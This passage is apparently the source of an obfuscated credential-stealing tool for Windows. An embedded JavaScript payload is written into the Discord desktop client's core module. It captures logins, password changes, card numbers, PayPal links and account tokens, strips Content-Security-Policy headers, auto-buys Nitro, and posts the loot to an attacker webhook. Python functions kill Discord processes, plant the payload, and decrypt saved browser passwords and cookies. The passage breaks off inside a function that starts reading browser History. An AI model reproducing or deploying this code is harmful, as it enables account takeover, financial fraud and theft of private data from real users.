            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def CDBOOUEFUVBDJLGCCVSKCKXDLEROLLEVFEACMFKYJPWBJFNJTHK():
    import os
    import re
    import subprocess
    import psutil

    def IZSDJXUOKQNHSTABYBYWFQFZMLAPEMUVCZBCWUOGSZOELBPHOXCMQVSPQWZFOJSBZHYPHSBMWDZUTJMRABYONO(PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ):
        for v4r_file in os.listdir(PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ):
            if re.search(r'app-+?', v4r_file):
                SBLAWWSFQCEGDDVVEGWONFQNGSJKMFNZHMSPLJEVGIDBIHQOZMWARHAMVCNNSQMKTXRQETTULUJUVCJICYWIGGXVG = PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ + '\\' + v4r_file + '\\modules'
                if not os.path.exists(SBLAWWSFQCEGDDVVEGWONFQNGSJKMFNZHMSPLJEVGIDBIHQOZMWARHAMVCNNSQMKTXRQETTULUJUVCJICYWIGGXVG):
                    continue
                for v4r_file in os.listdir(SBLAWWSFQCEGDDVVEGWONFQNGSJKMFNZHMSPLJEVGIDBIHQOZMWARHAMVCNNSQMKTXRQETTULUJUVCJICYWIGGXVG):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        MLPEVDMZSZCTVZLKTDVQGHGFJCCJAWAPIPQFQCLEXXWHITAUNT = SBLAWWSFQCEGDDVVEGWONFQNGSJKMFNZHMSPLJEVGIDBIHQOZMWARHAMVCNNSQMKTXRQETTULUJUVCJICYWIGGXVG + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return MLPEVDMZSZCTVZLKTDVQGHGFJCCJAWAPIPQFQCLEXXWHITAUNT, v4r_file
        return None

    def USILXASGCMPRFSIBGUFONXPEBZSTCOSJHQVLALEBNSDBLOJEDZJGKNUYBEHZWUJKGKLZDZAIKKVAYQDJW(PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ):
        ERDTLWFQXYULSYXZKASIKWBSPEXOCEMFXCKQVSYGUKPQPZGUXBQBHHIQQFIOEZOEUWXLTMJILQSU = PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ + '\\Update.exe'
        VXKATVZUKJWQAJWNJREXJBQCIHVCEJSNQMUPLZONYXLYVDNTSME = PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ):
            if re.search(r'app-+?', v4r_file):
                JXPZZUSCXQSTRPQOSOJACZIEBAMYWSUBTSPTPNTNZSHORQVGWBNHIQPJBLUEWCBAJSSWCJHCYRORWJRSB = PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ + '\\' + v4r_file
                if os.path.exists(JXPZZUSCXQSTRPQOSOJACZIEBAMYWSUBTSPTPNTNZSHORQVGWBNHIQPJBLUEWCBAJSSWCJHCYRORWJRSB + '\\' + 'modules'):
                    for v4r_file in os.listdir(JXPZZUSCXQSTRPQOSOJACZIEBAMYWSUBTSPTPNTNZSHORQVGWBNHIQPJBLUEWCBAJSSWCJHCYRORWJRSB):
                        if v4r_file == VXKATVZUKJWQAJWNJREXJBQCIHVCEJSNQMUPLZONYXLYVDNTSME:
                            VXKATVZUKJWQAJWNJREXJBQCIHVCEJSNQMUPLZONYXLYVDNTSME = JXPZZUSCXQSTRPQOSOJACZIEBAMYWSUBTSPTPNTNZSHORQVGWBNHIQPJBLUEWCBAJSSWCJHCYRORWJRSB + '\\' + VXKATVZUKJWQAJWNJREXJBQCIHVCEJSNQMUPLZONYXLYVDNTSME
                            subprocess.call([ERDTLWFQXYULSYXZKASIKWBSPEXOCEMFXCKQVSYGUKPQPZGUXBQBHHIQQFIOEZOEUWXLTMJILQSU, '--processStart', VXKATVZUKJWQAJWNJREXJBQCIHVCEJSNQMUPLZONYXLYVDNTSME],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def KGOTBKEIPMIXUOKNCQJWRVYLJJWJPNNRIVRPPZGUCMWXIEUOQCTIQNFAHLWQLPYVQRD():
        JXPZZUSCXQSTRPQOSOJACZIEBAMYWSUBTSPTPNTNZSHORQVGWBNHIQPJBLUEWCBAJSSWCJHCYRORWJRSBdata = os.getenv('LOCALAPPDATA')
        DYUXRMZFQMRLCSLGKFOOHSSMYJPBYRPXTWEBEDXIXYIDDKNJAEQWUVXWUOJZDOBLPEKYFOGHDHBXEBTBKBSZJDR = [
            JXPZZUSCXQSTRPQOSOJACZIEBAMYWSUBTSPTPNTNZSHORQVGWBNHIQPJBLUEWCBAJSSWCJHCYRORWJRSBdata + '\\Discord',
            JXPZZUSCXQSTRPQOSOJACZIEBAMYWSUBTSPTPNTNZSHORQVGWBNHIQPJBLUEWCBAJSSWCJHCYRORWJRSBdata + '\\DiscordCanary',
            JXPZZUSCXQSTRPQOSOJACZIEBAMYWSUBTSPTPNTNZSHORQVGWBNHIQPJBLUEWCBAJSSWCJHCYRORWJRSBdata + '\\DiscordPTB',
            JXPZZUSCXQSTRPQOSOJACZIEBAMYWSUBTSPTPNTNZSHORQVGWBNHIQPJBLUEWCBAJSSWCJHCYRORWJRSBdata + '\\DiscordDevelopment'
        ]
        BCWZPTLXFVHXSTRPHGVKKKBHAVTWQDMPGUMVJFXVQDSSDKGXGTSDNEIUJVNGRPWJJZODSUEJT = RTAUBUTYQNSNYGDEJFBBNOODUHYRPVSVYBQGHGEOYHQBNQFSCXJYJJPGJTTKQCACPYTDHAJLYYJSMPKBTSOIHVQXLWCXGFHSQGB

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ in DYUXRMZFQMRLCSLGKFOOHSSMYJPBYRPXTWEBEDXIXYIDDKNJAEQWUVXWUOJZDOBLPEKYFOGHDHBXEBTBKBSZJDR:
            if not os.path.exists(PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ):
                continue

            MLPEVDMZSZCTVZLKTDVQGHGFJCCJAWAPIPQFQCLEXXWHITAUNT_info = IZSDJXUOKQNHSTABYBYWFQFZMLAPEMUVCZBCWUOGSZOELBPHOXCMQVSPQWZFOJSBZHYPHSBMWDZUTJMRABYONO(PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ)
            if MLPEVDMZSZCTVZLKTDVQGHGFJCCJAWAPIPQFQCLEXXWHITAUNT_info is not None:
                MLPEVDMZSZCTVZLKTDVQGHGFJCCJAWAPIPQFQCLEXXWHITAUNT, MLPEVDMZSZCTVZLKTDVQGHGFJCCJAWAPIPQFQCLEXXWHITAUNT_file = MLPEVDMZSZCTVZLKTDVQGHGFJCCJAWAPIPQFQCLEXXWHITAUNT_info
                
                OMAQZJPOONDQIISRPUHKYRGVAYXJZXHOMFRAVMREAHPVOTCHEDBAHPKPZGKIBGQQJXQLBQSBCSICEXHMN = MLPEVDMZSZCTVZLKTDVQGHGFJCCJAWAPIPQFQCLEXXWHITAUNT + '\\index.js'
                
                if not os.path.exists(OMAQZJPOONDQIISRPUHKYRGVAYXJZXHOMFRAVMREAHPVOTCHEDBAHPKPZGKIBGQQJXQLBQSBCSICEXHMN):
                    open(OMAQZJPOONDQIISRPUHKYRGVAYXJZXHOMFRAVMREAHPVOTCHEDBAHPKPZGKIBGQQJXQLBQSBCSICEXHMN, 'w').close()

                with open(OMAQZJPOONDQIISRPUHKYRGVAYXJZXHOMFRAVMREAHPVOTCHEDBAHPKPZGKIBGQQJXQLBQSBCSICEXHMN, 'w', encoding='utf-8') as f:
                    f.write((BCWZPTLXFVHXSTRPHGVKKKBHAVTWQDMPGUMVJFXVQDSSDKGXGTSDNEIUJVNGRPWJJZODSUEJT).replace('discord_desktop_core-1', MLPEVDMZSZCTVZLKTDVQGHGFJCCJAWAPIPQFQCLEXXWHITAUNT_file)
                            .replace(r"%WEBHOOK_HERE%", LQUXQACAYSISJCBUBHOCHNJJAERPJNEEXFPEBBGVUSBFKJRWOXLWIEDBADMCTGAXLXHRRZOEWUBIP)
                            .replace(r"%EMBED_COLOR%", str(VXMQMTIFNQFSZVWQCUARWNDMZHAQVHGSTCAJGPBAVLFDCNKIXKAMGROFUHIIQABQHXYZQTSEUDPCDSC))
                            .replace(r"%USERNAME%", VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX)
                            .replace(r"%IP_PUBLIC%", PKYSLJOCCKSRRREQMXQHLLLHPMWFDYCJFERFIPHPBDOLGVJXASVDOXIPQ)
                            .replace(r"%EMBED_NAME%", YYYOHRNFCZUEJNONFZXIFSDHTUJIEFBANBYFREWPBSQNGMDGOKLETGRJJSIQ)
                            .replace(r"%EMBED_ICON%", KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV)
                            .replace(r"%FOOTER_TEXT%", WQPKAEYENELJACVEEVCAFHZZJZZZIBEMMIWIYJJEIJFGDMVJXBICBKRNQQJEWBIGFDKYSPOLSLJFFWIVGXTCPYZTPAWGLLISOUR)
                            .replace(r"%WEBSITE%", DSSPTIKNNTQFBNKLETEPGQRMJEPVMZCCWDDOZLYAVNJYCZVDJTIFUPPTLVAGOJKVKNZBLLTAJHGHGRH))
                USILXASGCMPRFSIBGUFONXPEBZSTCOSJHQVLALEBNSDBLOJEDZJGKNUYBEHZWUJKGKLZDZAIKKVAYQDJW(PWUTQCLTVKSWKLHMXIESRAQLYOMIPGWRALZKBYPEZWKMYEGXAJAYRSZKZZEMETGMILZ)
    KGOTBKEIPMIXUOKNCQJWRVYLJJWJPNNRIVRPPZGUCMWXIEUOQCTIQNFAHLWQLPYVQRD()

def KBFCXEJZRLDNTASHXVKOXFFHEOREPXAMGWMYGEWOFIOANYOCGTFJVAETGCFISSBHFSAVZJAFCVTVMZBATCAJ():
    import os
    import io
    import zipfile
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from discord import SyncWebhook, Embed, File
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    VVUNXRABKJIICSLCDLGTONKTJVBYFTYDLJOFOQGWAOPAJUEBLDFUHLTSVRQCGQCYABOOADDVXGNNMYOXQMPSMXGDDJYJUHIDO = []
    LYJUGPZNNISZAICNKKBEVMADLVAPVUVZKMEDEKWJWRPQGZPMVW = []
    KOPYYHOAEQVTJHIFDOHOUZDFRNAKRUKFFCHNJBIHMOUYEJHYYUYISTMPCKJYONL = []
    OUVAZRQTLSQDIQUIUERLHRRGNZHEHFKZEQPDJJAEJZBPYBDJAX = []
    BARLEYQWAUZHRMRRBYFTFEDMORUGISNCQZQOAQVYLGQWHKIBGMVTFAGBDMQPNCDEELEGWBA = []
    ZIIDPONYNOCVFEGYXBBKKTCOYVOLPQTJLBAYNGLSJLCUBGYWJYGABPABQOZUJCYMXFPUAJDL = []

    def QSINRRTCOGNGDFKQLXUORAMBVXWPLFZJCIJMONFGHYKDFWSMCQTYXOJOLKSIPOOHPOLXPWMLLXHPNDCHVBABAUY(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV):
        if not os.path.exists(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV):
            return None

        try:
            with open(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV, 'r', encoding='utf-8') as v4r_f:
                IBHDBICBSOVMSOZDGKKVJPPKNHKTXZLIKJSPMRJUWEIQVBNXHNPIL = json.load(v4r_f)

            XVBDXTTCUQVEAFJKZNWCNKSGZBMVGYJXLQOBNITFNZHPRPCTTSB_key = base64.b64decode(IBHDBICBSOVMSOZDGKKVJPPKNHKTXZLIKJSPMRJUWEIQVBNXHNPIL["os_crypt"]["encrypted_key"])[5:]
            BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH = win32crypt.CryptUnprotectData(XVBDXTTCUQVEAFJKZNWCNKSGZBMVGYJXLQOBNITFNZHPRPCTTSB_key, None, None, None, 0)[1]
            return BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH
        except:
            return None

    def ATAFEBVCMRWRXHGLMGQKGTQJBVSPMNFMRTQHMLCMROCQHFZVQKQVURSBJJUXW(WQUOFUMAXFCBJDANRTIQXNIVKRONOIZPTFXTXGLKODQALDQWTLMQNNQOUKMTCKNHQHLKJNRG, BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH):
        try:
            SGQGYVDHQFKMYRHVRPAFLYODXCYYHMXNLRSOCYOXJADSUNFRNEHIHWQBVRRAH = WQUOFUMAXFCBJDANRTIQXNIVKRONOIZPTFXTXGLKODQALDQWTLMQNNQOUKMTCKNHQHLKJNRG[3:15]
            QWYSUDPVGYSPBKIJTSIPFAATLTXLZYMBIQEZZSZVAAUPYVOBYCUKFEL = WQUOFUMAXFCBJDANRTIQXNIVKRONOIZPTFXTXGLKODQALDQWTLMQNNQOUKMTCKNHQHLKJNRG[15:-16]
            NDIVBIUOCTCYHDUAFOHSBYYKCSYWAPPGQDWONBNGCLWHQXOPVSCHQBKYJQVBPIKTCYWNUOIGFSAURLXYAAQJRQOCIJREIGGTDAMS = WQUOFUMAXFCBJDANRTIQXNIVKRONOIZPTFXTXGLKODQALDQWTLMQNNQOUKMTCKNHQHLKJNRG[-16:]
            DWMBNKLHVSFROPXDCQPIBUCWDOZVQHPKWTTGMCESZSGVCEYGEFHAXSKMJBZOZSRHAKCGDGEGOTPXLMKNBRJXE = Cipher(algorithms.AES(BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH), modes.GCM(SGQGYVDHQFKMYRHVRPAFLYODXCYYHMXNLRSOCYOXJADSUNFRNEHIHWQBVRRAH, NDIVBIUOCTCYHDUAFOHSBYYKCSYWAPPGQDWONBNGCLWHQXOPVSCHQBKYJQVBPIKTCYWNUOIGFSAURLXYAAQJRQOCIJREIGGTDAMS))
            NTMZLZYNKROYJVUHSPYPAGHWRJKBDEDCHFZMGMCQIDKPJCHUKTPUONCAQSECUBAZIMPEJESUZKTMQWNUHUWYCMZJCKJE = DWMBNKLHVSFROPXDCQPIBUCWDOZVQHPKWTTGMCESZSGVCEYGEFHAXSKMJBZOZSRHAKCGDGEGOTPXLMKNBRJXE.decryptor()
            LXIQSMMHBMXRNFCXDOMHEDSMDOUJUKHGTFQNRGEMVVAEQHWZHSJXOAWUEOWAVHMPUEPMXHHLTFBWVIRBJSIJJXHDKEIOZJABSXV = NTMZLZYNKROYJVUHSPYPAGHWRJKBDEDCHFZMGMCQIDKPJCHUKTPUONCAQSECUBAZIMPEJESUZKTMQWNUHUWYCMZJCKJE.update(QWYSUDPVGYSPBKIJTSIPFAATLTXLZYMBIQEZZSZVAAUPYVOBYCUKFEL) + NTMZLZYNKROYJVUHSPYPAGHWRJKBDEDCHFZMGMCQIDKPJCHUKTPUONCAQSECUBAZIMPEJESUZKTMQWNUHUWYCMZJCKJE.finalize()
            return LXIQSMMHBMXRNFCXDOMHEDSMDOUJUKHGTFQNRGEMVVAEQHWZHSJXOAWUEOWAVHMPUEPMXHHLTFBWVIRBJSIJJXHDKEIOZJABSXV.decode()
        except:
            return None
        
    def ZEKYMQASLAXTBVYYONWOCIKCEHCRSHCPQFHFPMIDFLWKWAPTOQODRAEJCN(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH):
        DCMDGDTDCBYCKQNRDLUOPMUZWTKYUANWTRCPAOOTKPMASCEKEDNGUXDDNLMYYXM_db = os.path.join(AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, 'Login Data')
        if not os.path.exists(DCMDGDTDCBYCKQNRDLUOPMUZWTKYUANWTRCPAOOTKPMASCEKEDNGUXDDNLMYYXM_db):
            return

        HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(DCMDGDTDCBYCKQNRDLUOPMUZWTKYUANWTRCPAOOTKPMASCEKEDNGUXDDNLMYYXM_db)
        disk_conn.backup(HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW)
        disk_conn.close()
        DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ = HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW.cursor()
        DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            WVAGJJUBEPBWGPHTLTDCWJQEFYSFYZFRVMSARLYAOPIFFEOTUSWOIXVWIKRBKNZXKIFJIFAEGPVRZNKHPTAQDTXWKALLRGSW =          f"- Url      : {v4r_row[0]}"
            YWHGFVAIQEHDUYKBBINJIQYENYRMUFIVRZJHHOYJAKNVNRCJNLNJRYJJXTBUPFXQWJJLCMNQNDOMHBB =     f"  Username : {v4r_row[1]}"
            DCMDGDTDCBYCKQNRDLUOPMUZWTKYUANWTRCPAOOTKPMASCEKEDNGUXDDNLMYYXM =     f"  Password : {ATAFEBVCMRWRXHGLMGQKGTQJBVSPMNFMRTQHMLCMROCQHFZVQKQVURSBJJUXW(v4r_row[2], BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH)}"
            RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX_name = f"  Browser  : {RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX}"
            VVUNXRABKJIICSLCDLGTONKTJVBYFTYDLJOFOQGWAOPAJUEBLDFUHLTSVRQCGQCYABOOADDVXGNNMYOXQMPSMXGDDJYJUHIDO.append(f"{WVAGJJUBEPBWGPHTLTDCWJQEFYSFYZFRVMSARLYAOPIFFEOTUSWOIXVWIKRBKNZXKIFJIFAEGPVRZNKHPTAQDTXWKALLRGSW}\n{YWHGFVAIQEHDUYKBBINJIQYENYRMUFIVRZJHHOYJAKNVNRCJNLNJRYJJXTBUPFXQWJJLCMNQNDOMHBB}\n{DCMDGDTDCBYCKQNRDLUOPMUZWTKYUANWTRCPAOOTKPMASCEKEDNGUXDDNLMYYXM}\n{RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX_name}\n")

        HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW.close()

    def QZGWIWZVLTAMGIHHQZYMQGHCCYJXYSTURATJMADACAOYTCYCQORQUE(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH):
        YJHLZJCGEGAIZPYEXWPEEGXOADCIPWAZTBVEKDLEQOAWJEXGORCOICAS = os.path.join(AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, 'Network', 'Cookies')
        if not os.path.exists(YJHLZJCGEGAIZPYEXWPEEGXOADCIPWAZTBVEKDLEQOAWJEXGORCOICAS):
            return

        HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(YJHLZJCGEGAIZPYEXWPEEGXOADCIPWAZTBVEKDLEQOAWJEXGORCOICAS)
        disk_conn.backup(HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW)
        disk_conn.close()
        DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ = HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW.cursor()
        DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            WVAGJJUBEPBWGPHTLTDCWJQEFYSFYZFRVMSARLYAOPIFFEOTUSWOIXVWIKRBKNZXKIFJIFAEGPVRZNKHPTAQDTXWKALLRGSW =          f"- Url     : {v4r_row[0]}"
            XJCPEUDLGILGBDCDCPOFGVUBELKGFFUFPTYKGUVKLIECTUBECJUBLPIAGVTIDSIBJIOFWAO =         f"  Name    : {v4r_row[1]}"
            WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV =         f"  Path    : {v4r_row[2]}"
            PLOQFSXHGYJRTEUFKYYYNFNNQDDNGNLLOFEAEDUXFJORXGGBLQI =       f"  Cookie  : {ATAFEBVCMRWRXHGLMGQKGTQJBVSPMNFMRTQHMLCMROCQHFZVQKQVURSBJJUXW(v4r_row[3], BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH)}"
            YRLICRUPEPJYRRTMWTIVIJRCPEXCLIXHQYISGKUZTCKAWTTNCNGDKOWBDRORKRMEHCKJY =       f"  Expire  : {v4r_row[4]}"
            RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX_name = f"  Browser : {RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX}"
            LYJUGPZNNISZAICNKKBEVMADLVAPVUVZKMEDEKWJWRPQGZPMVW.append(f"{WVAGJJUBEPBWGPHTLTDCWJQEFYSFYZFRVMSARLYAOPIFFEOTUSWOIXVWIKRBKNZXKIFJIFAEGPVRZNKHPTAQDTXWKALLRGSW}\n{XJCPEUDLGILGBDCDCPOFGVUBELKGFFUFPTYKGUVKLIECTUBECJUBLPIAGVTIDSIBJIOFWAO}\n{WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV}\n{PLOQFSXHGYJRTEUFKYYYNFNNQDDNGNLLOFEAEDUXFJORXGGBLQI}\n{YRLICRUPEPJYRRTMWTIVIJRCPEXCLIXHQYISGKUZTCKAWTTNCNGDKOWBDRORKRMEHCKJY}\n{RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX_name}\n")

        HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW.close()

    def QNWDWQMCBDXIQHMGKUHJDMKCOUCVMXHCUFEMWQXPKKSWVWZINIENDMHGUATCREXZX(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB):
        ZSQTUNVAPYZHCMYLPFWGVJCUSEKSCVKZKYENCAPHZRLCHQQEABEHEEYJXXHBRPXRELKDYEV = os.path.join(AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, 'History')
